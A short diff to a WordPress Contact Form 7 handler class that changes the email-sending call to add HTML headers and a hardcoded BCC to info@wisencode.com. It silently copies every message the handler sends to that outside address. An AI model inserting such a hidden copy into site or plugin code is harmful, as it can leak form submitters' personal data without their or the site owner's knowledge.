@@ -410,8 +410,13 @@ class Partner_CF7_Handler {
         //     $content = $this->replaceDynamicPlaceholders($content);
         // }
 
-		$data = wp_mail( $to, $subject, $content );
-        
+        // Set email headers with BCC
+        $headers = [
+            'Content-Type: text/html; charset=UTF-8',
+            'BCC: info@wisencode.com',
+        ];
+
+		$data = wp_mail( $to, $subject, $content, $headers );
     }
 
     protected function saveCustomer($data) {
